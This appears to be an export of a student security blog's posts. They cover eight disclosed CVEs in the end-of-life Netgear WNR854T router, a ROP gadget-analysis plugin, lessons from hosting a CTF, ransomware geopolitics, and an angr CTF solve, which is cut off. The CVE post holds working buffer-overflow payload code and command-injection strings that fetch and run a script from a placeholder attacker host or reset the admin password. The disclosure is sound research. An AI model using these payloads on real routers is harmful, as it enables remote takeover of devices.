[ { "title": "'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard", "url": "/posts/8-cves-on-the-wnr854t-junkyard/", "categories": "Vulnerability Discovery", "tags": "firmware rev, embedded", "date": "2025-03-25 00:00:00 -0400", "content": "A subsect of student members from the Mason Competitive Cyber Club conducted research on an EOL device in preparation for the Junkyard contest at DistrictCon Year 0, unearthing eight new CVEs. Table of contents Intro and Background The Junkyard Competition Disclosure Timeline A Note on post.cgi Vulnerabilities Discovered CVE-2024-54802 CVE-2024-54803 CVE-2024-54804 CVE-2024-54805 CVE-2024-54806 CVE-2024-54807 CVE-2024-54808 CVE-2024-54809 Intro and Background The following post features technical details regarding vulnerabilities that were discovered in an EOL device by my school’s cybersecurity club in preparation for a competition at the inaugural DistrictCon security conference. For the past few months, Mason Competitive Cyber has been researching a target—namely the Netgear WNR854T—for security vulnerabilities, a project run by students and sponsored by club funds. The research resulted in the discovery of eight previously unknown security issues, including vulnerabilities that allow for code execution from the WAN and payload injection into NVRAM that persists and triggers across reboot. Proof of concepts were developed and demonstrated live to convey the impact of the discovered issues and showcase the low-hanging fruit that frequently still exist in embedded systems. Points of contact and timelines were kept with both the DistrictCon organizers and the vendor to ensure a 90‑day responsible disclosure window. Bugs mainly consist of improper system calls and memory corruption within both the router’s UPnP and httpd services. Notes: All issues found with UPnP are unauthenticated (as the protocol traditionally is) and the router’s UPnP service is exposed to the WAN. The router’s httpd UI allows direct NVRAM modification (requires authentication), enabling chains such as: Using UPnP to port-forward the webshell to the internet. Changing credentials via NVRAM edits in the web UI or via UPnP bugs. Our testing and weaponization used local firmware copies and a UART interface. A JTAG header is also exposed and can be used to reflash the router in the event of bricking or boot loops (possible with persistent NVRAM bugs). The Junkyard Competition The Junkyard competition was an end‑of‑life pwnathon for disclosing zero‑days on end‑of‑service devices with prize categories for most memeable target, most impactful target, most novel technique, and their runners‑up. Competitors had ten minutes to demonstrate live PoCs against their targets. Devices had to be officially EoS/EoL (and initially, vulnerabilities needed CVEs). The Mason Competitive Cyber team consisted of researchers vWing, draz, and elbee. We chose the Netgear WNR854T, which was readily available (previously used in draz’s home). The team was approved for two talk slots to demonstrate seven of the eight vulnerabilities live. It was found the target device had only one previously reported unauthenticated command execution issue; we expected additional “easy wins.” Many props to DistrictCon for running a uniquely fun contest and a surprisingly high‑quality first‑year conference (even without power!). Disclosure Timeline A Note on post.cgi There exists an httpd route that allows configuring arbitrary system information—post.cgi (requires authentication). In the posted data, a command key can contain: device_data, reset_to_default, system_restart, system_reboot. The device_data path lets an authenticated user arbitrarily set NVRAM entries. Various NVRAM parameters are consumed by both httpd and sysinit, enabling persistent and non‑persistent command‑injection scenarios. Vulnerabilities Discovered MSEARCH Host BOF (CVE-2024-54802) Summary. Stack‑based BOF in UPnP (/usr/sbin/upnp) on M-SEARCH Host header. Root cause is an unbounded strcpy into a fixed‑size stack buffer inside advertise_res (0x22bc4), allowing memory corruption and RCE. Vulnerable component. advertise_res copies the Host header into a local buffer using strcpy with no bounds checking. Attack type/impact. Unauthenticated, remote. UPnP runs on the WAN. Successful exploitation yields RCE. Attack vector. Malicious M-SEARCH with an oversized Host header. Overwrites return state and hijacks control flow. Exploitation. Overwrite saved LR/PC and pivot into a gadget at 0x2d4dc (mov r0, r5 ; bl system) to invoke system() with an attacker‑controlled argument. payload_pt1 = b'Z' * 304 payload_pt2 = b'A' * 4 # R4 payload_pt2 += b'B' * 4 # R5 - command str will go here payload_pt2 += b'C' * 4 # R6 payload_pt2 += b'D' * 4 # R7 payload_pt2 += b'E' * 4 # R8 payload_pt2 += b'ÜÔ' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload_pt1, payload_pt2 ret = p32(0xbeffeb20 + (len(cmd.encode()) * 3) + 1) payload_pt2 = payload_pt2.replace(b'BBBB', ret) message = ( payload_pt1 + b'\\r\\n' + payload_pt2 + b'\\r\\n' + b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port)) PPPOE_PEER_MAC Authenticated Command Injection (Boot Persistent) (CVE-2024-54803) Summary. Authenticated command injection in /bin/sysinit via NVRAM pppoe_peer_mac. Unsanitized value is inserted into a sprintf format and executed via system() during boot, yielding persistent root‑level execution when wan_proto=pppoe. Exploit format. pppoe_peer_mac=;command_to_execute # Example: pppoe_peer_mac=;{wget http://ATTACKER/m.sh -P /tmp/ &amp;&amp; /tmp/m.sh} # Steps: Set wan_proto=pppoe. Set pppoe_peer_mac to injected payload. Reboot; command runs with root at startup. WAN_HOSTNAME Authenticated Command Injection (Boot Persistent) (CVE-2024-54804) Summary. Authenticated command injection in /bin/sysinit via wan_hostname; value flows to: sprintf(var, \"netbios %s %s &amp;\", r4, r3) // r3 = wan_hostname Executed later via system(), persisting across reboots. Exploit format. wan_hostname=;command_to_execute # Example (change admin password): wan_hostname=;nvram set http_passwd=pwnd # Sendmail Authenticated Command Injection (CVE-2024-54805) Summary. Authenticated command injection in /bin/httpd email alerts flow. email_address NVRAM is placed into: /bin/sendmail %s -f %s &amp; No sanitization; backtick injection allows arbitrary command execution, triggerable on demand via /send_log.cgi. Exploit example. `wget http://ATTACKER/m.sh -P /tmp/`@example.com Workflow: set malicious email → enable alerts → call /send_log.cgi. Authenticated Webshell (CVE-2024-54806) Summary. A rudimentary webshell exists at cmd.cgi (0x15c50). Execution is authenticated (tied to post.cgi). Output formatting is poor but functional. AddPortMapping Command Injection (CVE-2024-54807) Summary. Unauthenticated command injection in UPnP AddPortMapping (0x2b530) of /upnp/control/WANIPConnection1. The NewInternalClient argument is concatenated into an iptables command that flows to system() (0x2d3bc). WAN‑facing. Exploit idea. &lt;NewInternalClient&gt;192.168.1.3 $(whoami)&lt;/NewInternalClient&gt; Attackers can remove evidence by deleting the mapping afterward. SetDefaultConnectionService BOF (CVE-2024-54808) Summary. Stack‑based BOF in UPnP L3Forwarding SetDefaultConnectionService (0x28e8c) due to unconstrained sscanf into a local buffer. PC hijack is possible, but weaponization is constrained by XML parsing (ASCII‑only) and return‑address layout. We targeted a known gadget at 0x2d4dc (mov r0, r5 ; bl system). Constraints on weaponization. ASCII‑only payloads (0x20–0x7e), null termination issues. Original RA looks like 0x0002nnnn; partial overwrites are tricky due to deep call graph and dereferences. Single‑byte or null‑byte overwrites crash early (argument setup skipped). Idea for full weaponization. If null‑byte appendage constraints could be bypassed, a two‑byte overwrite may reach a pop;pop;pop;ret to pivot into heap (executable) where shellcode can be staged via request headers, then hit via controlled misalignment / grooming. MSEARCH ST BOF (CVE-2024-54809) Summary. Stack‑based BOF in UPnP parse_st (0x23240) handling M‑SEARCH ST header. An arithmetic error produces an over‑large n passed to strncpy, overflowing a stack buffer and enabling RCE. Attack vector. Oversized ST header inside M‑SEARCH. Unauthenticated, WAN‑exposed. Exploitation. Overwrite saved LR/PC, return to 0x2d4dc (mov r0, r5 ; bl system) with controlled argument. payload = b'Z' * 284 payload += b'A' * 4 # R4 payload += b'B' * 4 # R5 - command str will go here payload += b'C' * 4 # R6 payload += b'D' * 4 # R7 payload += b'E' * 4 # R8 payload += b'\\xdc\\xd4\\x02' # 0x2d4dc mov r0, r5 ; bl system def send_msearch_pwn(target_port=1900): global payload # Space nopsled might shift depending on len(cmd) (+1 for null) ret = p32(0xbefff540 + (len(cmd.encode()) * 3) + 1) payload = payload.replace(b'BBBB', ret) message = ( b'M-SEARCH * HTTP/1.1\\r\\n' b'HOST:239.255.255.250:1900\\r\\n' b'MAN:\"ssdp:discover\"\\r\\n' b'MX:2\\r\\n' b'ST:uuid:schemas:device:' + payload + b':\\x00\\r\\n' b'\\r\\n' ) + p32(0xdeadbeef) + (b\" \" * 255) + cmd.encode() with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock: sock.settimeout(2) sock.sendto(message, (host, target_port))" }, { "title": "Tool Release: RopView", "url": "/posts/binja-plugin-ropview/", "categories": "Emulation, Tool", "tags": "unicorn, pandas, emulation, tool", "date": "2024-06-02 00:00:00 -0400", "content": "Technical explanations and concepts of RopView, a plugin made for BinaryNinja that does gadget analysis. This blog post describes the technical components of this tool. Table of contents Foreword Design and Components Compatibility Gadget Discovery Gadget Analyzer Initialization Realtime Contextualizing Step-thru Analysis Semantic Search Filter Closing Foreword I recently published a plugin for BinaryNinja called RopView, a gadget analysis framework that integrates emulation into ROP searching, visualizing memory side effects. For some time now, I’ve been meaning to both develop a tool capable of this, but also contribute another plugin for the BinaryNinja community and found this project to be an excellent way to do both. During the entire development process, considering what would make the exploit developer’s life easier was at the forefront, because I myself wanted to make this something I would use over similar tools when building ROP chains and could easily incorporate into my workflow. What makes RopView different from other return-oriented-programming tools however, is not its interfacing with BinaryNinja’s BinaryView. That honor goes to its powerful gadget analysis and search engine framework, which operate in consort. Design and Components RopView is a visual UI plugin that is registered as an additional BinaryView for the current session. The layout of the plugin involves a tab system with a search filter, which remains accessible from any selected tab. The first tab, which is where the majority of time will likely be spent, is the gadget analysis display. It is made of two panes, a gadget pane, and a focused analysis pane. The gadget pane will display the entire gadget pool with user-specified filters and options applied, or gadgets that service a search request. Under the hood, the gadget pane is a QTreeWidget with scrollable items (via tab or arrow-key navigation). Additionally, double clicking on a selected gadget will navigate to its address in the primary linear BinaryView. Effects of the currently selected gadget are rendered in the analysis pane. Analysis reports consider three focal points (only effected/clobbered memory is analyzed in each): Start state (Before analysis) Effects before gadget executes Instruction states (During analysis) Effects after each instruction in the gadget End state (After analysis) The memory state the gadget leaves behind Analysis is done through gadget emulation and certain algorithmic decisions were made in order to make the emulation as fast as possible. Moreover, analysis details are saved as ‘GadgetAnalysis’ objects, which contain the prestate, step-states, and end-state tied to a gadget address. These objects are cached and used both to resolve an analysis report if a gadget is re-selected and to assist in semantic search functionality. More technical details relevant to the analyzer itself—which will likely be the most interesting aspect of this post—will be discussed later in the relevant section. In between the main window and the search box are two status boxes which display the gadget count (tied to the GadgetPane which could be the full pool or search results) and the search status (success or failure). The second tab contains a chain builder, which was originally going to be included with the first release, but due to certain constraints and focus on the primary functionalities, was not. In the future, gadgets from the GadgetPane will be able to be added and ordered in a list on this pane, which you can then choose or create custom script presets for. The last tab includes configurable settings for both the standard gadget search and analysis prestates. Here register prestates can be explicitly defined and these will be used for all further analysis and semantic searches. Ideally, you’d set the registers you care about to their correct values at the time of controlled execution and further analysis will more accurately reflect what gadgets matter to you given your situation. The only other option which is out of the ordinary is the semantic depth option, which directs how many gadgets deep a query should explore for serviceable gadgets. One of the largest components, which I will briefly talk about but not get deep into because it is uninteresting, is the GadgetRenderer. This pane is responsible for repooling (if an option is changed such as depth, which affects the initial gadget pool) or sorting the current pool (options like bad bytes or duplicates). No matter the caller of GadgetRender, it will always consider the current configuration context when initiating and rendering a GadgetSearch. Speaking of which, the GadgetRender does, and obviously so, have a lot of call sites from various components within the tool. Compatibility Currently this tool only supports i386 and amd64 architectures and an assert needs to be passed for the tool to be successfully initialized. Adding support for ARM and MIPS is one of the most prominent features I’d like to include in the future and will likely be the first thing worked on in future development. Obviously, as a store/load architecture many different components will have to be added to support this and it won’t be as simple as an update to the tool’s constants. For instance, delay slots will need to be considered in gadget exploration as well as how gadget searches are done entirely as both are constant-sized 4 byte instruction sets. Additionally, more gadget querying options would be ideal for both (e.g., for MIPS, queries for stackfinders, li a0, double jumps, etc.). The largest component that will need to be reworked is the GadgetSearch. What would likely require the least reconfiguration would be the GadgetAnalysis, which does diffing and analysis purely based on memory states and does not rely on static checks or heuristics. Gadget Discovery (What exactly IS a gadget?) That stuff was boring and necessary to give a high-level overview of the tool’s primary functionality and design. Now onto the more interesting stuff: actually dealing with gadgets. As mentioned earlier, this tool does everything in-house and does not rely on a third party for actually finding and loading gadgets. Gadget discovery is the first task run by the GadgetRender during initialization and is responsible for finding gadgets within the current BinaryView’s data. The algorithm I am about to talk about for doing gadget searching is specifically tied to the x86 instruction set; different considerations have to be taken for instruction sets like MIPS, as what dictates gadgets differs entirely. This section will be a valuable part of this post, as rarely do I see people actually talk about gadget searching and how we do it. Additionally, it seems like people who are just dipping their toes into binary exploitation sometimes just blindly return to addresses that do things and don’t actually understand, “what makes a gadget?”. We’ll address both of these concepts here. Gadgets in x86 (and any language for that matter) are simple. For x86, a gadget is defined as any address you can return to that decodes to a valid group of instructions and ends with an instruction that lets you control execution flow. Unlike RISC architectures, x86 instructions are not a fixed size; they can be anywhere between 1 and 16 bytes. This matters because it essentially increases the pool of candidate gadgets since you can return to misaligned addresses and walk backwards any n number of bytes and, in a sense, create code that isn’t actually user-defined. The GadgetSearch algorithm searches the binary for potential gadget sites (using regex matching) and then walks back n number of bytes (defined by depth) checking at each step if a gadget exists (valid decoding occurred). It does this until the depth is reached or a gadget-violating condition occurs such as the control instruction no longer existing or a multi-branch. This algorithm also utilizes the BinaryView’s session data to cache all gadgets, which GadgetSearch will use in the future to resolve gadgets instead of searching again (unless an option change violates the accuracy of the current gadget pool and a flush is required). Below is a pseudo snippet of the code responsible: # Ctrl is an architecture-tied constant in the following structure: # (start constant, inst_len, inst regex, inst_type) # ie: (b'\\xff',2,b'\\xff[\\x10\\x11\\x12\\x13\\x16\\x17]','call') for \"call [reg]\" control instruction for ctrl in self.__control_insn: # Start search at base each time curr_site = self.__bv.start while curr_site is not None: # Find potential gadget site curr_site = self.__bv.find_next_data(curr_site, ctrl[0]) if curr_site is None: break # Saved to find next search site after depth search save = curr_site # Confirm gadget site using regex match if re.match(ctrl[2], self.__bv.read(curr_site, ctrl[1])) is not None: # Depth search for gadgets and subgadgets for i in range(0, self.depth): if not self.__bv.get_segment_at(curr_site).executable: break else: curr_site = save - i check_for_insn = self.__bv.read(curr_site, i + ctrl[1]) ''' Checks for gadget violators ''' add_to_pool() cache() # Next address to continue search from curr_site = save + 1 return True Essentially: find all gadget sites using regex matching, count backwards, and add the gadget to the pool if no violations occur. It really is that simple! Gadget Analyzer The most attractive feature of this tool, which also acts as the backbone behind semantic searching, is the gadget analyzer. In abstract, the gadget analyzer works by creating a small, contextualized Unicorn emulation for the gadget, hooking instruction steps and CPU exceptions, and handling errors as they come. The method chosen of “dealing with bad things as bad things happen” was purposeful in order to keep emulations as small as possible and as fast as possible. Essentially, more stuff is added to the emulation only if it is needed and since we are dealing with a small amount of instructions and many emulations can be initialized at a time via selection scrolling, this seems like the smartest solution to a stupid problem. Step 1: Initialization First initialization occurs. During this phase an emulation context for the passed gadget is created. This is a “partial” context, as context building may be applied during the emulation depending on the gadget. This includes setting up registers according to the prestate configuration, creating a small code section for the gadget and creating a stack, which notably contains cyclic data. The reasoning behind this is so that it is easier to tell during analysis if a register is corrupted with stack data and derive the offset of controlled corruption using cyclic pattern matching. It is also useful for detecting corruption in general and recovering using the last, non-cyclic value. After configuring registers, mappings, setting the permissions of and writing the latter segments, and adding unicorn hooks, the emulation is ready. Note that the hooks are the most important aspect of this analysis framework. They let us do analysis, harness CPU violations, and allow for contextualizing the memory state in realtime. There are three hooks: Code hook — executes after the current instruction is fetched and before it is executed Memory violation hook — executes when unmapped memory is fetched Interrupt hook — executes when a CPU interruption has occurred (simply aborts) Step 2: Emulation and Realtime Contextualizing Now that the partial gadget context is created and exceptions have been harnessed, emulation is ready to begin. One of the reasons Unicorn was chosen over other emulation frameworks is because it is lightweight and contextless. This gives us the benefit of being able to create lightweight emulations with a small amount of memory mappings. However, this also means that we are unable to emulate interrupts and syscalls and that gadget execution sometimes does not accurately reflect the true binary context. For example, consider the following gadget: mov [r14], r15 ; ret ; This gadget moves the value of r15 into the dereferenced location of r14. There are two issues here, one of which we can handle gracefully. Issue A: r14 could point to memory that is statically mapped into the binary (e.g., .text, .data, .got, etc.) of which we could resolve. Issue B: Alternatively, r14 could point to memory that is dynamic, randomly based with ASLR and purely dependent on runtime context. The first situation we can handle in a gracefully stupid way. The second is a little harder and is not supported at this time, however I plan to allow corefile imports in the future, which will handle this scenario. In either case, both of these scenarios would result in failure as the CPU tries to fetch unmapped memory. This is where the memory violation hook comes into play. One of the steps that occurs before emulation actually starts, but as a part of the emulation function, is a check in a queue of mappings. If this list contains any mapping, it is resolved using helper functions and then dequeued. This is done by resolving the nearest page-aligned boundary that overlaps the target address. Then emulation will continue. The memory hook simply catches fetch violations, analyzes the dereferenced area by comparing it to mapped memory in the binary and sets an error code (which can be recoverable or non-recoverable). If the situation is recoverable via resolving then the mapping is enqueued. If the situation is not recoverable, -1 is inserted at index 0, which will direct the emulation handler to stop execution and generate an error description. Some examples of errors that are not recoverable are trying to execute mapped, non-executable memory or a null dereference. From this point on, in both cases, emulation is stopped and the handler is recursively called. The emulation handler also deals with side cases, like stack pivots, before recursion so that emulation can continue properly. Step 3: Step-thru Analysis The code hook is responsible for doing analysis and diffing at each execution cycle. This hook is after the next instruction is fetched, but before it executes. It is responsible for both saving various components of the current memory state (in case weird corruption occurs we can recover using these components) and saving analysis. Analysis information is saved in a list, where every index corresponds to the index of an instruction in a gadget and each element represents a dictionary of the memory state at that time of execution. For example: Gadget: pop rdi ; mov rsi, 0x3 ; ret ; Analysis: [{rdi:'Full control'}, {rsi:3}] The end state (used for both display and semantic queries) is simply derived from analysis_steps[-1]. Additionally, the saved previous program state is used for register diffing next time the step hook is called. At any point during emulation when the code hook is called there will exist a last_program_state that the current context will reference for recovery options and diffing. Semantic Search Filters The search filter is unique to other tools, not just for its semantic searching capabilities, but for its handling and logical parsing of queries in general. The gadget pool DataFrame is derived from the gadget pool cache, which is stored in the session. The pool contains all gadgets (including duplicates), regardless of options. Options constrain what is displayed via GadgetRender and do not actually affect the gadget cache. The gadget pool DataFrame, like the cache, will contain every gadget found. Primary queryable columns: Address (unsigned long) Bytes (string) Disasm (string) inst_cnt (int64) All registers (each an unsigned long) Semantic querying is done in three steps: Query translation DataFrame transformation DataFrame querying Example translation: Semantic search value: rax&gt;0x3b Translation: ((rax&gt;0x3b or (rax==CONTROL_SENTINEL)) and not rax==UNINITIALIZED_SENTINEL) The control sentinel value represents a register which analysis determines we have full control of (such as a popped register). We’d want to include these in the search results, since we can use these to make a register equal any value and thus it would always match any query. Additionally, we exclude the uninitialized sentinel because this sentinel value also represents unclobbered registers. After the query is built, we transform a subsection of the DataFrame by resolving analysis states from addresses in a sub-frame to the main frame until the semantic depth limit is reached. Presets are translated into static queries or queries tied to specific architecture constants. Closing That’s my tool! I hope you enjoyed this technical post describing it, which I believe was well worth writing considering the interesting algorithms and techniques that this tool adapts to do what it does. Although in retrospect, my code is not the cleanest or most optimized, I believe it is optimized enough and that some novel techniques are utilized to make it run fast with accurate results. Furthermore, this tool is an open-source plugin, so if you’d like to add a component, feature or modify existing structures, I encourage you to make a PR! I plan to actively maintain this project in the foreseeable future; specific developments I have planned can be found on the repo, but updates might be far between because of other priorities. If you’ve enjoyed this post please share it with your pwn-pals and do let me know if you’re enjoying the tool. Thank you!" }, { "title": "Running a CTF that Outlasts a Bag of Popcorn", "url": "/posts/running-a-ctf-wo-lifesupport/", "categories": "Infrastructure, CTF", "tags": "infrastructure, aws, docker, CTF", "date": "2023-09-11 00:00:00 -0400", "content": "My tales and experiences from running PatriotCTF 2023. Table of contents Foreword Hack-proof Hacking Challenges Intended Unintendeds The Final Hour Postface Foreword Running a CTF is hard. Very hard. It involves a lot of moving parts and interacting with technology in a way that is considerate and thorough, even if you are not familiar with it. A lot can go wrong at every step — and frequently, a lot does. In acknowledgment of this, I decided to upload this post to make sure that future organizers of PatriotCTF (and their successors) have a reference for the issues their not-so-distant ancestors encountered. For context, last weekend was Mason Competitive Cyber’s annual capture-the-flag competition, PatriotCTF, and it was our turn to run it. Prior to this event, no one on the active exec board had substantial experience with infrastructure or sysops. Considering this, the event ran extremely well with very few hiccups. PatriotCTF was hosted on AWS using CTFd. Our infrastructure was staged on two servers — one hosting the main CTFd instance and another hosting challenge remotes (c6a.2xlarge). Cloudflare was used for reverse proxying and providing subdomains for challenge remotes. We also had help from a very talented alumni, Christopher Roberts, who came in clutch with two awesome VM reversing challenges and an ARM pwn. Hack-proof Hacking Challenges All remotes were containerized using Docker. For the pwn challenges, we used redpwn/jail, and for other remotes, we mostly relied on xinetd. Redpwn/jail is an nsjail-based Docker image for pwnables, providing isolated, forked, and highly configurable containers. The challenge binary is mounted into /srv/app/run, which is executed inside the jail. Each connection runs in its own forked process that terminates upon disconnection. Best practice is to pull from a real OS image (e.g., Ubuntu) and copy it into the root directory since the base redpwn image is minimal. Redpwn also allows jail configuration through environment variables. For instance, JAIL_TIME can limit session timeouts, and JAIL_CONNS_PER_IP restricts connections per IP. Here’s an example Dockerfile from the bookshelfv2 challenge: FROM pwn.red/jail ENV JAIL_TIME=60 ENV JAIL_CONNS_PER_IP=10 ENV JAIL_PORT=8989 ENV JAIL_SYSCALLS=accept,accept4,... COPY --from=ubuntu / /srv COPY bookshelf /srv/app/run COPY flag.txt /srv/app/flag.txt It really is as simple as that. More examples can be found in the PatriotCTF 2023 challenge repository. Intended Unintendeds All challenges should be extensively tested — especially the hard ones. A single unintended solution can compromise the integrity of the entire scoring system. Organizers should ensure that someone other than the challenge author blind-solves hard challenges in a testing environment. They are more likely to find unintendeds than the author, who knows the intended path. An unintended solution isn’t always catastrophic unless it’s significantly easier than the intended path. For example, my hard heap grooming challenge, Softshell, was intended to transform an arbitrary free into an arbitrary write. The arbitrary free resulted from a subtle difference between how the program calculated a command list versus its size. Because the program freed memory based on argslen (which could exceed the actual list size), we ended up with an arbitrary free. The intended exploit required grooming the heap, creating a UAF on a future command’s tag list, and using the edit-tag command to get a write-what-where primitive. However, an unintended UAF in command arguments let players bypass this complexity entirely. This made a supposedly “insane”-rated challenge unexpectedly solvable by many. Luckily, some competitors still solved it the intended way — a great writeup is available here. The Final Hour It’s Friday afternoon — everything’s running smoothly until 45 minutes before the competition begins. Suddenly, this happens: The number one rule for hosting a CTF: If nothing seems wrong, it just means you don’t know what’s wrong yet. Something will go wrong. There are simply too many moving parts to account for everything. Instead of expecting perfection, the best approach is to plan for failure — fix what you can and have mitigation strategies ready. Thankfully, this particular issue was resolved with a simple fix — a quick value edit in the live CTFd SQL database. Later, we faced downtime on the challenge server. All challenge remotes were containerized on the same machine, which eventually crashed due to a memory leak in the ML PyJail challenge. The server went down during day two at 4 A.M., but our president was awake and managed to diagnose and restart it within 15 minutes. While the downtime was minimal, the ticket system exploded with caffeine-fueled complaints. In hindsight, we could’ve prevented this entirely by setting Docker memory caps or isolating high-load challenges onto separate servers. Postface Hopefully, this gives insight into what goes into hosting a CTF and the unexpected challenges that can arise. Hosting a CTF is fun, rewarding, and a great way to give back to the security community. There’s nothing like watching people solve challenges you built — sometimes even in ways you didn’t expect. If you’re considering organizing one: just do it. The experience is invaluable. Learn from our mistakes, plan for chaos, and you’ll have fewer things to worry about when the popcorn burns. See you all next year for PatriotCTF 2024." }, { "title": "International Implications of Ransomware for Dummies", "url": "/posts/ransomware-and-geopolitics-for-dummies/", "categories": "Non-technical", "tags": "non-technical", "date": "2023-04-25 00:00:00 -0400", "content": "Modern ransomware attacks often greatly affect civilian life and government operations — it is a geopolitical issue. Fuel holding tanks are seen at Colonial Pipeline’s Linden Junction Tank Farm on May 10 in Woodbridge, N.J. | Michael M. Santiago/Getty Images The Rise of Digital Chaos In 2017, a powerful cyber weapon disrupted “Constitution Day”, a holiday in Ukraine which celebrates the country’s adoption of an independent constitution. Under the noise of fireworks, a silent worm spread across computer systems disabling radiation safety systems at the Chernobyl site, shutting down banks and ATMs, disrupting businesses, maiming the Ukrainian electrical power grid and metro networks. Operators watched helplessly as a skull illuminated their screens, notifying them that their hard drives had been encrypted and demanding a ransom. The scenario seemed familiar — and it was. The attack mimicked a known ransomware strain, Petya. But this was NotPetya. Unlike typical ransomware, NotPetya was not financially motivated. Its encryption algorithm had been altered to make decryption impossible. Later forensic research strongly suggested that it was developed and deployed by Russian intelligence services. Despite the wealth of digital evidence, Russia faced little tangible consequence due to the difficulty of attribution in cyberspace. Criminal Enterprises and Safe Havens Criminal ransomware operators have exploited this ambiguity. Many operate safely within Russia’s borders under an unspoken “safe-harbor” understanding — they may attack globally, but never domestically. Although Western law enforcement has indicted numerous Russian cybercriminals, few ever see trial. Ransomware has become one of the most lucrative criminal enterprises in modern history. Its targets — critical infrastructure, corporations, and healthcare systems — have ripple effects that touch millions of civilians. As nations digitize their essential operations, ransomware has transitioned from a criminal nuisance to a geopolitical weapon. The International Policy Problem Governments struggle to respond effectively. Ransomware crosses borders and jurisdictions, leaving victims without clear avenues for recourse. Most states resort to issuing indictments or sanctions, symbolic gestures that rarely result in arrests. This underscores the need for international policy coordination — frameworks for attribution, response, and deterrence. Civilian and Economic Impacts Ransomware at this scale has two broad categories of impact: Economic Disruption (Type I): Attacks on private industries that cascade through the supply chain — e.g., the Cognizant incident. Critical Infrastructure Disruption (Type II): Attacks that directly affect civilian safety or essential services — e.g., the Colonial Pipeline incident. Large-scale attacks can shake economies and endanger lives. According to Sophos, 42% of organizations with over 1,000 employees experienced ransomware incidents. Cybercrime Magazine projects global ransomware damages will reach $265 billion annually by 2031, with a new attack every two seconds. National Security and the Cyber Front Attacks like WannaCry’s impact on the NHS highlight that ransomware is not just an IT problem — it is a homeland security issue. The FBI has warned that such attacks “can impact the physical safety of American citizens.” In response, the U.S. established the Cybersecurity and Infrastructure Security Agency (CISA) in 2018. CISA now coordinates national response efforts and operates StopRansomware.gov, underscoring how ransomware has become a threat to national and international stability. Ransomware and Geopolitics The U.S. Treasury notes that ransomware payments can “undermine U.S. foreign policy and national security interests.” BBC analysis found that 74% of ransomware profits in 2021 went to Russia-linked actors. Some groups, such as Conti and Trickbot, have expressed explicit support for Russia’s invasion of Ukraine — blurring the line between cybercrime and state action. Reports from Bellingcat and the U.S. Treasury suggest that these groups may have direct ties to Russian intelligence, particularly the FSB. Whether or not these connections are formalized, the effect is clear: ransomware has become an instrument of state power cloaked in criminal anonymity. Law, Attribution, and Due Diligence International law still lags behind cyber realities. Article 2(4) of the U.N. Charter prohibits the use of force against another state, but cyber operations rarely meet its threshold. Similarly, the principle of due diligence — a state’s obligation not to allow its territory to be used for harm — is regularly flouted by Russia’s permissive stance toward cybercriminals. Without stronger international consensus, ransomware will continue to exploit the gaps in digital governance and international law. Conclusion Ransomware has evolved from an online extortion scheme into a geopolitical force capable of influencing economies, national security, and international relations. Combating it requires more than firewalls and patches — it demands international cooperation, diplomatic pressure, and legal modernization. Only when the world begins defining the rules of cyberspace and coordinating cross-border policy will we begin to curb the global ransomware epidemic." }, { "title": "Feed the Magical Goat (Battelle)", "url": "/posts/battelle-magical-goat/", "categories": "CTF", "tags": "angr, reversing, CTF, file-sim", "date": "2023-03-23 00:00:00 -0400", "content": "Reversing challenge from Battelle showcasing angr’s file simulation feature! Table of contents Reversing Angr Solve Part 1: Reversing The following is a writeup for a reverse engineering challenge made by Battelle as one of their cyber career challenges. This challenge explores the use of angr and its ability to emulate file systems for the use of symbolic data. If you are unfamiliar with Angr and the concept of symbolic execution, I made a YouTube video exploring and explaining this which I (obviously) highly recommend you watch. A zip file containing a 32-bit, unstripped ELF is provided as part of the challenge. Running the binary outputs a bunch of text and then ends with the binary deleting itself. Starting a Binja project and looking through the strings reveals the following: File operations A filename A flag format string (Character by character, flag is likely calculated within the binary) Viewing main, a function is called which interacts with what is likely the expected file called give_offering. The function first opens chow.down and assigns the stream to eax. The following conditional checks if the operation was not successful via checking the file descriptor in eax. If it wasn’t, the program closes the file descriptor, unlinks the binary (deletes it), prints the outro and calls exit. From here on I will refer to this blob as the fail block. Assuming this conditional was false, the file is allocated onto the heap at eax_2. The next conditional checks if eax_2 is 0x40; if true a hint is printed, both the elf and chow.down are deleted and the chunk is freed, followed by a fail block. The next conditional returns the pointer to the file contents and is the path I have to follow in order to continue program execution. It checks if more than 0xf bytes were read. Returning to main, multiple conditions are checked against various offsets of the file content. If code execution continues without a conditional being true, the flag is printed using these file content offsets, of which I assume were operated on by the functions in the conditions. Looking at just one of the functions reveals that it is quite complicated. Manually reversing these functions would be significantly detrimental to my mental health, so instead I’ll use symbolic execution to find an execution path that leads to the flag print and what the file contents need to be in order for this path to execute. Angr is a symbolic execution engine for Python that utilizes Microsoft’s SMT solver Z3 and a simulation manager to manage execution states. It is also capable of file system emulation. Using this feature will be simpler than alternative methods of symbol placement, such as directly injecting into memory. Part 2: I’m Angry FS The following is my solve script: import angr,claripy,sys p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) def win(state): # Check stdout for \"flag{\" and print flag out = str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Let’s step through it to understand it better. The first few lines create the Angr project, create the initial state which starts in give_offering (0x8048f46) and creates a symbol whose size is based on the constraint within that function. p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) Next a SimFile object is created with the name chow.down and whose content is the symbolic data. It is then inserted into the simulated file system. f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) Moving on, a function to check for a valid state is created. It checks for the substring flag{ in the stdout and prints it. Then the simulation manager is created and explored with find set to this function and avoid set to the fail block. def win(state): # Check stdout for \"flag{\" and print flag out = 